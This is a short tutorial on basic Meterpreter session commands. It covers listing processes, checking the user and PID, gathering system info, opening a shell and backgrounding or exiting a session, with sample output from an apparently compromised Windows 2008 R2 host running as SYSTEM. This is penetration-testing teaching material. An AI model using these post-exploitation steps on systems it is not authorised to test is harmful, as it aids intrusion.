# communication for sending commands:

## We will start off by using a simple `?` command, which will just list all the available Meterpreter commands with short description:
```python
meterpreter > ?
```

## Let's start with some system commands:

### background:
- This command is used to set the current session as the background so that it can be used again when needed.
- This command is useful when there are multiple active Meterpreter sessions.
#### Code 
```python
meterpreter > 
Background session 1? [y/N]  y
```

### getuid:
- This command returns the username that is running or the on which we broke into, on the target machine
#### Code 
```python
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### getpid:
- This command returns the process ID in which we are currently running Meterpreter:
#### Code
```python
meterpreter > getpid
Current pid: 5504
```

### ps:
- This command will list all the running processes on the target machine.
#### Code
```python
meterpreter > ps

Process List
============

 PID   PPID  Name                    Arch  Session  User                          Path
 ---   ----  ----                    ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                  x64   0
 132   468   svchost.exe             x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 252   4     smss.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 296   468   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
-----------------------------------SNIP---------------------------------------
```

### sysinfo:
- As the name says, it gives system information such as system and architecture info.
#### Code 
```python
meterpreter > sysinfo 
Computer : VAGRANT-2008R2 
OS : Windows 2008 R2 (Build 7601, Service Pack 1). 
Architecture : x64 System Language : en_US 
Domain : WORKGROUP 
Logged On Users : 2 
Meterpreter : x86/windows
```

### shell:
- This command takes us to a shell prompt.
#### Code 
```python
meterpreter > shell
Process 5716 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
```

### exit:
- This command is used to terminate a Meterpreter session.
- It can also be used to terminate the shell session and return to Meterpreter